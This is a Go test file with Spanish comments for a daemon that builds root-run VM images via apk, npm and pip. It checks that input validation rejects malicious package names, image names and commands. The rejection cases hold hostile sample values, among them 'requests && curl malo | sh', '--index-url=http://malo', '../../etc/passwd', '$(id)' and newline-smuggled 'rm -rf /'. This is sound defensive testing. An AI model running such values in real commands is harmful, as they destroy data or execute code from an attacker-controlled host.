package daemon

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/juan52878911/kindling/internal/api"
	"github.com/juan52878911/kindling/internal/events"
	"github.com/juan52878911/kindling/internal/machine"
)

// buildScriptArgs traduce el request a los flags de 80-mcp-image.sh. El único
// matiz que importa por corrección: -bundle (y el resto de flags) va ANTES de `--`,
// porque parse_build_opts deja de leer flags al ver `--`.
func TestBuildScriptArgs(t *testing.T) {
	base := api.BuildImageRequest{
		Name: "svc", NPM: []string{"@scope/server"}, Packages: []string{"nodejs", "npm"},
		Cmd: []string{"server-bin", "--flag"},
	}

	// Sin bundle: no aparece -bundle.
	got := buildScriptArgs(base)
	if idx := indexOf(got, "-bundle"); idx != -1 {
		t.Errorf("sin Bundle no debería haber -bundle: %v", got)
	}

	// Con bundle: aparece -bundle y ANTES del separador --.
	base.Bundle = true
	got = buildScriptArgs(base)
	bi, sep := indexOf(got, "-bundle"), indexOf(got, "--")
	if bi == -1 {
		t.Fatalf("falta -bundle: %v", got)
	}
	if sep == -1 || bi > sep {
		t.Errorf("-bundle (%d) debe ir antes de -- (%d): %v", bi, sep, got)
	}
	// El comando del servidor queda después de --, intacto.
	if got[len(got)-2] != "server-bin" || got[len(got)-1] != "--flag" {
		t.Errorf("el comando no quedó tras --: %v", got)
	}
	// Modo siempre stdio y el nombre como segundo arg.
	if got[0] != "stdio" || got[1] != "svc" {
		t.Errorf("cabecera esperada [stdio svc], got %v", got[:2])
	}
}

func indexOf(xs []string, s string) int {
	for i, x := range xs {
		if x == s {
			return i
		}
	}
	return -1
}

// validateBuild es lo único que separa el socket del daemon de un `apk add` y
// un `npm install -g` corriendo como root con argumentos ajenos. Los campos
// llegan a esos comandos SIN comillas dentro del script, y el nombre acaba
// siendo la ruta $ROOT/images/$NAME.ext4.
func TestValidateBuildRechaza(t *testing.T) {
	ok := api.BuildImageRequest{
		Name:     "files",
		Packages: []string{"nodejs", "npm"},
		NPM:      []string{"@modelcontextprotocol/server-filesystem@2025.8.21"},
		Cmd:      []string{"mcp-server-filesystem", "/data"},
	}
	if err := validateBuild(ok); err != nil {
		t.Fatalf("una petición legítima no debería fallar: %v", err)
	}

	cases := []struct {
		nombre string
		mutate func(*api.BuildImageRequest)
	}{
		// El nombre es un componente de ruta.
		{"nombre con barra", func(r *api.BuildImageRequest) { r.Name = "a/b" }},
		{"nombre con travesía", func(r *api.BuildImageRequest) { r.Name = "../../etc/passwd" }},
		{"nombre vacío", func(r *api.BuildImageRequest) { r.Name = "" }},
		{"nombre con espacio", func(r *api.BuildImageRequest) { r.Name = "mi servicio" }},
		{"nombre con punto y coma", func(r *api.BuildImageRequest) { r.Name = "a;rm" }},
		{"nombre demasiado largo", func(r *api.BuildImageRequest) { r.Name = strings.Repeat("a", 65) }},
		{"base con travesía", func(r *api.BuildImageRequest) { r.Base = "../min" }},

		// apk y npm reciben estos valores sin comillas: inyección de argumentos.
		{"apk con espacio", func(r *api.BuildImageRequest) { r.Packages = []string{"nodejs npm"} }},
		{"apk como opción", func(r *api.BuildImageRequest) { r.Packages = []string{"--allow-untrusted"} }},
		{"apk con punto y coma", func(r *api.BuildImageRequest) { r.Packages = []string{"nodejs;id"} }},
		{"npm como opción", func(r *api.BuildImageRequest) { r.NPM = []string{"--registry=http://malo"} }},
		{"npm con espacio", func(r *api.BuildImageRequest) { r.NPM = []string{"uno dos"} }},
		{"npm con ruta", func(r *api.BuildImageRequest) { r.NPM = []string{"../../tmp/x"} }},

		// El comando se escribe en el entrypoint generado, una línea.
		{"comando vacío", func(r *api.BuildImageRequest) { r.Cmd = nil }},
		{"comando con salto de línea", func(r *api.BuildImageRequest) { r.Cmd = []string{"sh", "a\nrm -rf /"} }},
		{"comando con byte nulo", func(r *api.BuildImageRequest) { r.Cmd = []string{"sh", "a\x00b"} }},

		{"crecimiento negativo", func(r *api.BuildImageRequest) { r.GrowMB = -1 }},
		{"crecimiento absurdo", func(r *api.BuildImageRequest) { r.GrowMB = 1 << 20 }},
	}

	for _, c := range cases {
		t.Run(c.nombre, func(t *testing.T) {
			r := ok
			c.mutate(&r)
			if err := validateBuild(r); err == nil {
				t.Errorf("debería rechazarlo: %+v", r)
			}
		})
	}
}

func TestValidateBuildAcepta(t *testing.T) {
	cases := []api.BuildImageRequest{
		{Name: "eco", Cmd: []string{"/opt/mcp/server"}},
		{Name: "files-2", Base: "min", Packages: []string{"nodejs", "npm", "py3-pip"},
			NPM: []string{"@scope/pkg", "otro@1.2.3"}, Cmd: []string{"bin", "--flag", "valor con espacios"}},
		{Name: "a", Cmd: []string{"x"}, GrowMB: 8192},
	}
	for _, r := range cases {
		if err := validateBuild(r); err != nil {
			t.Errorf("%q debería valer: %v", r.Name, err)
		}
	}
}

// Los nombres de paquetes de pip acaban en `pip install $PIP` SIN comillas
// dentro del script, igual que los de apk y npm.
//
// Ahí, un valor que empieza por guion no es un paquete: es un flag. Y
// `--index-url` apuntando a otro sitio convierte una instalación en la
// ejecución de código de quien controle ese índice.
func TestNombresDePipQueNoDebenColar(t *testing.T) {
	malos := []string{
		"--index-url=http://malo", // cambia de dónde se descarga
		"-e",                      // instalación editable desde una ruta
		"requests; rm -rf /",      // separador de comandos
		"requests && curl malo | sh",
		"req uests", // el espacio parte el argumento
		"../../etc/passwd",
		"",
		"paquete$(id)",
		"paquete`id`",
	}
	for _, p := range malos {
		if err := validateBuild(api.BuildImageRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err == nil {
			t.Errorf("aceptó el paquete pip %q", p)
		}
	}

	// Y los que sí son legítimos, con sus especificadores de versión.
	buenos := []string{"requests", "semgrep", "python-lsp-server",
		"requests==2.31.0", "flask>=2.0", "numpy~=1.26.0", "urllib3!=2.0.0"}
	for _, p := range buenos {
		if err := validateBuild(api.BuildImageRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err != nil {
			t.Errorf("rechazó el paquete pip legítimo %q: %v", p, err)
		}
	}
}

// TestHandleImages cubre GET /images: enumera los .ext4 (menos overlay-template),
// marca cuáles tienen receta y cuenta los snapshots dorados que salen de cada
// imagen (el dato que dice cuál se puede retirar sin dejar servicios sin base).
func TestHandleImages(t *testing.T) {
	root := t.TempDir()
	mgr, err := machine.NewManager(root, "", "", events.New())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	imgs := filepath.Join(root, "images")

	// foo (con receta) y bar (sin); overlay-template debe quedar fuera.
	for _, n := range []string{"foo", "bar", "overlay-template"} {
		if err := os.WriteFile(filepath.Join(imgs, n+".ext4"), []byte("rootfs-bytes"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(imgs, "foo.recipe.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	// Dos snapshots que salen de foo, ninguno de bar.
	for _, name := range []string{"svc1", "svc2"} {
		dir := filepath.Join(root, "snapshots", name)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		meta := `{"name":"` + name + `","image":"foo"}`
		if err := os.WriteFile(filepath.Join(dir, "meta.json"), []byte(meta), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	s := &Server{mgr: mgr, root: root}
	rr := httptest.NewRecorder()
	s.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/images", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status %d: %s", rr.Code, rr.Body.String())
	}
	var out []api.Image
	if err := json.Unmarshal(rr.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v (%s)", err, rr.Body.String())
	}

	byName := map[string]api.Image{}
	for _, img := range out {
		byName[img.Name] = img
	}
	if _, ok := byName["overlay-template"]; ok {
		t.Error("overlay-template no debería listarse como imagen")
	}
	foo, ok := byName["foo"]
	if !ok {
		t.Fatalf("falta foo en %v", out)
	}
	if !foo.HasRecipe {
		t.Error("foo debería tener receta")
	}
	if foo.UsedBy != 2 {
		t.Errorf("foo.UsedBy = %d, want 2", foo.UsedBy)
	}
	if foo.SizeBytes == 0 {
		t.Error("foo.SizeBytes (lógico) no debería ser 0")
	}
	if foo.DiskBytes == 0 {
		t.Error("foo.DiskBytes (asignado en disco) no debería ser 0 para un fichero con contenido")
	}
	bar, ok := byName["bar"]
	if !ok {
		t.Fatalf("falta bar en %v", out)
	}
	if bar.HasRecipe {
		t.Error("bar no debería tener receta")
	}
	if bar.UsedBy != 0 {
		t.Errorf("bar.UsedBy = %d, want 0", bar.UsedBy)
	}
}

// Una imagen por capas se lista UNA vez, con su nombre de siempre, midiendo su
// capa —no la base, que es de todas—; y la base tiene que decir cuántas capas se
// apoyan en ella, que es lo que dice si se puede retirar.
func TestHandleImagesPorCapas(t *testing.T) {
	root := t.TempDir()
	mgr, err := machine.NewManager(root, "", "", events.New())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	imgs := filepath.Join(root, "images")

	// La base, y dos servicios que solo guardan su delta encima.
	if err := os.WriteFile(filepath.Join(imgs, "min.ext4"), []byte(strings.Repeat("b", 4096)), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, n := range []string{"files", "semgrep"} {
		if err := os.WriteFile(filepath.Join(imgs, n+".layer.ext4"), []byte("delta"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(imgs, n+".recipe.json"),
			[]byte(`{"name":"`+n+`","base":"min"}`), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	s := &Server{mgr: mgr, root: root}
	rr := httptest.NewRecorder()
	s.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/images", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("status %d: %s", rr.Code, rr.Body.String())
	}
	var out []api.Image
	if err := json.Unmarshal(rr.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v (%s)", err, rr.Body.String())
	}
	byName := map[string]api.Image{}
	for _, img := range out {
		byName[img.Name] = img
	}

	// El sufijo largo también acaba en .ext4: recortar el corto dejaría una
	// imagen fantasma llamada "files.layer".
	if _, ok := byName["files.layer"]; ok {
		t.Errorf("la capa se listó como imagen aparte: %v", out)
	}
	files, ok := byName["files"]
	if !ok {
		t.Fatalf("falta files en %v", out)
	}
	if files.Base != "min" {
		t.Errorf("files.Base = %q, want min", files.Base)
	}
	if files.SizeBytes != int64(len("delta")) {
		t.Errorf("files.SizeBytes = %d: debe medir la CAPA, no la base", files.SizeBytes)
	}
	base, ok := byName["min"]
	if !ok {
		t.Fatalf("falta min en %v", out)
	}
	if base.Layers != 2 {
		t.Errorf("min.Layers = %d, want 2: sin esto la base parece retirable", base.Layers)
	}
	if base.Base != "" {
		t.Errorf("min no se apoya en nada, y dice %q", base.Base)
	}
}
